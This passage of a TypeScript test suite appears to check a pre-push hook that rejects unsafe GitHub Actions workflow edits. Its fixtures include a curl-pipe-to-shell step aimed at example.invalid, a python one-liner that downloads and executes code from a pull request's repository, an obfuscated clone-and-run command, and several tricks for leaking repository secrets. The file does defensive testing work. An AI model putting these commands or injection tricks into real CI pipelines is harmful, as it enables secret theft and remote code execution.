      withJob("build_mac", { env: { ALL: "${{ toJSON(secrets) }}" } }),
      "secrets may only be read by jobs.publish",
    ],
    [
      "an upper-case secrets context",
      withJob("build_other", { env: { KEY: "${{ SECRETS.GOAT_RELEASES_APP_ID }}" } }),
      "secrets may only be read by jobs.publish",
    ],
    ...(["\n", "\t", "\r"] as const).map(
      (space) =>
        [
          `a secret after ${JSON.stringify(space)}`,
          withJob("build_mac", {
            env: { KEY: `${"${{"}${space}secrets['GOAT_RELEASES_APP_PRIVATE_KEY'] }}` },
          }),
          "secrets may only be read by jobs.publish",
        ] as [string, string, string],
    ),
    [
      "prepare outputs that do not come from the resolve step",
      withJob("prepare", { outputs: { sha: "main", skip: "false" } }),
      "jobs.prepare outputs sha and skip must come from its pinned resolve step",
    ],
    [
      "a secret read in an if condition",
      withJob("build_mac", { if: `${downstreamGateText} && (secrets.GOAT_RELEASES_APP_ID != '')` }),
      "secrets may only be read by jobs.publish",
    ],
    [
      "a resolve step that does not verify the commit",
      withJob("prepare", {
        steps: [
          { id: "resolve", run: 'echo "sha=main" >> "$GITHUB_OUTPUT"' },
          checkout("${{ steps.resolve.outputs.sha }}"),
        ],
      }),
      "jobs.prepare outputs sha and skip must come from its pinned resolve step",
    ],
    [
      "a secret behind a quoted closing brace",
      withJob("build_mac", {
        env: { KEY: "${{ format('}}{0}', secrets.GOAT_RELEASES_APP_PRIVATE_KEY) }}" },
      }),
      "secrets may only be read by jobs.publish",
    ],
    [
      "a secret in an expression-valued key",
      withJob("build_mac", {
        env: { "${{ format('KEY_{0}', secrets.GOAT_RELEASES_APP_ID) }}": "value" },
      }),
      "secrets may only be read by jobs.publish",
    ],
    [
      "a job default shell that replaces the resolve interpreter",
      withJob("prepare", {
        defaults: { run: { shell: "bash -c 'echo sha=main >> $GITHUB_OUTPUT' {0}" } },
      }),
      "jobs.prepare outputs sha and skip must come from its pinned resolve step",
    ],
    [
      "a step that runs before the resolve step",
      withJob("prepare", {
        steps: [{ run: "echo BASH_ENV=/tmp/x >> $GITHUB_ENV" }, shippedResolveStep()],
      }),
      "jobs.prepare outputs sha and skip must come from its pinned resolve step",
    ],
    [
      "a resolve step that can be skipped",
      withJob("prepare", {
        steps: [
          { ...shippedResolveStep(), if: "false" },
          checkout("${{ steps.resolve.outputs.sha }}"),
        ],
      }),
      "jobs.prepare outputs sha and skip must come from its pinned resolve step",
    ],
    [
      "a partial expression wrapper after the gate",
      withJob("build_mac", { if: `${downstreamGateText} && (${"${{"} always() }})` }),
      "jobs.build_mac.if must start with the prepare gate",
    ],
    [
      "a prepare checkout that runs after the resolver failed",
      withJob("prepare", {
        steps: [
          shippedResolveStep(),
          { ...checkout("${{ steps.resolve.outputs.sha }}"), if: "always()" },
        ],
      }),
      "jobs.prepare outputs sha and skip must come from its pinned resolve step",
    ],
    [
      "the token action outside publish",
      withJob("build_mac", {
        steps: [checkout(), { uses: "actions/create-github-app-token@v2" }],
      }),
      "only jobs.publish may create a GitHub App token",
    ],
    [
      "publish on a self-hosted runner",
      withJob("publish", { "runs-on": macRunner }),
      "jobs.publish must run on ubuntu-24.04",
    ],
    [
      "a checkout of an unverified ref",
      withJob("build_mac", { steps: [checkout("${{ github.event.workflow_run.head_sha }}")] }),
      "must check out ${{ needs.prepare.outputs.sha }} with persist-credentials: false",
    ],
    [
      "write permissions beyond contents",
      withJob("publish", { permissions: { contents: "write", issues: "write" } }),
      "jobs.publish may only request contents: write",
    ],
    [
      "write-all permissions",
      withJob("build_mac", { permissions: "write-all" }),
      "jobs.build_mac may only request contents: write",
    ],
    [
      "issues: read outside publish",
      withJob("build_other", { permissions: { contents: "write", issues: "read" } }),
      "jobs.build_other may only request contents: write",
    ],
    [
      "write permissions on prepare",
      withJob("prepare", { permissions: { contents: "write" } }),
      "jobs.prepare must not request write permissions",
    ],
    [
      "an Actions artifact upload",
      withJob("build_mac", { steps: [checkout(), { uses: "actions/upload-artifact@v4" }] }),
      "jobs.build_mac step 1.uses is not an allowed action",
    ],
    [
      "an Actions artifact download",
      withJob("build_other", { steps: [{ uses: "actions/download-artifact@v4" }] }),
      "jobs.build_other step 0.uses is not an allowed action",
    ],
  ])("refuses %s", (_name, content, reason) => {
    const result = push(content);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain(`goat pre-push: ${nightlyPath} in refs/heads/test (`);
    expect(result.stderr).toContain(reason);
  });
});

const closeOutsidePrsPath = ".github/workflows/close-outside-prs.yml";

describe("goat pre-push close-outside-prs workflow guard", () => {
  const shippedSource = NodeFS.readFileSync(NodePath.join(sourceRoot, closeOutsidePrsPath), "utf8");
  const yaml = NodeModule.createRequire(import.meta.url)(yamlSource) as {
    parse: (source: string) => Record<string, any>;
  };
  function shipped() {
    return yaml.parse(shippedSource);
  }
  function push(content: string) {
    const f = fixture();
    f.write(closeOutsidePrsPath, content);
    const sha = f.commit();
    return f.hook(f.record(sha));
  }
  function patched(edit: (workflow: Record<string, any>) => void) {
    const workflow = shipped();
    edit(workflow);
    return JSON.stringify(workflow);
  }

  it("allows the shipped workflow while it stays active on GitHub", () => {
    const result = push(shippedSource);
    expect(result.stderr).toBe("");
    expect(result.status).toBe(0);
  });

  it.each([
    [
      "a pull_request trigger",
      patched((w) => {
        w.on.pull_request = null;
      }),
      "on must be exactly pull_request_target with types [opened, reopened]",
    ],
    [
      "a synchronize event",
      patched((w) => {
        w.on.pull_request_target.types.push("synchronize");
      }),
      "on must be exactly pull_request_target with types [opened, reopened]",
    ],
    [
      "contents: write",
      patched((w) => {
        w.permissions.contents = "write";
      }),
      "permissions must be exactly pull-requests: write",
    ],
    [
      "a checkout step",
      patched((w) => {
        w.jobs.close.steps.unshift({ uses: "actions/checkout@v6" });
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "a step that checks out the pull request",
      patched((w) => {
        w.jobs.close.steps.unshift({ run: 'gh pr checkout "$PR_NUMBER"' });
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "an expression in the script",
      patched((w) => {
        w.jobs.close.steps[0].run += "\necho ${{ github.event.pull_request.title }}";
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "the pull request head in env",
      patched((w) => {
        w.jobs.close.steps[0].env.HEAD = "${{ github.event.pull_request.head.sha }}";
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "a secret in env",
      patched((w) => {
        w.jobs.close.steps[0].env.GH_TOKEN = "${{ secrets.GOAT_RELEASES_TOKEN }}";
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "a job without the same-repository exemption",
      patched((w) => {
        w.jobs.close.if = "github.event.pull_request.author_association != 'OWNER'";
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "a self-hosted runner",
      patched((w) => {
        w.jobs.close["runs-on"] = runnerLabels;
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "a script that downloads and runs code from the pull request",
      patched((w) => {
        w.jobs.close.steps[0].run =
          "python3 -c \"import json,os,urllib.request as u;e=json.load(open(os.environ['GITHUB_EVENT_PATH']));exec(u.urlopen(e['pull_request']['head']['repo']['html_url']).read())\"";
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "a quoted git clone",
      patched((w) => {
        w.jobs.close.steps[0].run = 'g"it" clone "$GH_REPO" pr && sh pr/run.sh';
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "a secret in a step name",
      patched((w) => {
        w.jobs.close.steps[0].name = "${{ startsWith(secrets.PRIVATE_KEY, 'a') }}";
      }),
      "jobs.close must match the reviewed job; review it and update the pinned hash",
    ],
    [
      "an expression in the workflow name",
      patched((w) => {
        w.name = "${{ secrets.PRIVATE_KEY }}";
      }),
      "name must not contain expressions",
    ],
    [
      "a second job",
      patched((w) => {
        w.jobs.build = w.jobs.close;
      }),
      "jobs must be exactly close",
    ],
    [
      "workflow-level env",
      patched((w) => {
        w.env = { FOO: "bar" };
      }),
      "only name, on, permissions and jobs are allowed at the workflow level",
    ],
  ])("refuses %s", (_name, content, reason) => {
    const result = push(content);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain(`goat pre-push: ${closeOutsidePrsPath} in refs/heads/test (`);
    expect(result.stderr).toContain(reason);
  });
});

const marketingPagesPath = ".github/workflows/marketing-pages.yml";

describe("goat pre-push marketing-pages workflow guard", () => {
  const shippedSource = NodeFS.readFileSync(NodePath.join(sourceRoot, marketingPagesPath), "utf8");
  const yaml = NodeModule.createRequire(import.meta.url)(yamlSource) as {
    parse: (source: string) => Record<string, any>;
  };
  function push(content: string) {
    const f = fixture();
    f.write(marketingPagesPath, content);
    const sha = f.commit();
    return f.hook(f.record(sha));
  }
  function patched(edit: (workflow: Record<string, any>) => void) {
    const workflow = yaml.parse(shippedSource);
    edit(workflow);
    return JSON.stringify(workflow);
  }

  it("allows the shipped workflow while it stays active on GitHub", () => {
    const result = push(shippedSource);
    expect(result.stderr).toBe("");
    expect(result.status).toBe(0);
  });

  it.each([
    [
      "a pull_request trigger",
      patched((w) => {
        w.on.pull_request = null;
      }),
    ],
    [
      "Pages permissions on the build job",
      patched((w) => {
        w.jobs.build.permissions = { pages: "write", "id-token": "write" };
      }),
    ],
    [
      "contents: write",
      patched((w) => {
        w.permissions.contents = "write";
      }),
    ],
    [
      "an action pinned to a tag",
      patched((w) => {
        w.jobs.deploy.steps[0].uses = "actions/deploy-pages@v5";
      }),
    ],
    [
      "a secret in the build",
      patched((w) => {
        w.jobs.build.steps[2].env.TOKEN = "${{ secrets.GOAT_RELEASES_TOKEN }}";
      }),
    ],
    [
      "an extra step before the deploy",
      patched((w) => {
        w.jobs.deploy.steps.unshift({ run: "curl -fsSL https://example.invalid | sh" });
      }),
    ],
    [
      "a self-hosted runner",
      patched((w) => {
        w.jobs.build["runs-on"] = runnerLabels;
      }),
    ],
    [
      "a deploy from another branch",
      patched((w) => {
        w.jobs.build.if = "github.repository == 'goat-si/goat'";
      }),
    ],
    [
      "a deploy without the repository switch",
      patched((w) => {
        w.jobs.build.if = "github.repository == 'goat-si/goat' && github.ref == 'refs/heads/dev'";
      }),
    ],
  ])("refuses %s", (_name, content) => {
    const result = push(content);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain(`goat pre-push: ${marketingPagesPath} in refs/heads/test (`);
    expect(result.stderr).toContain("must match the reviewed workflow");
  });
});
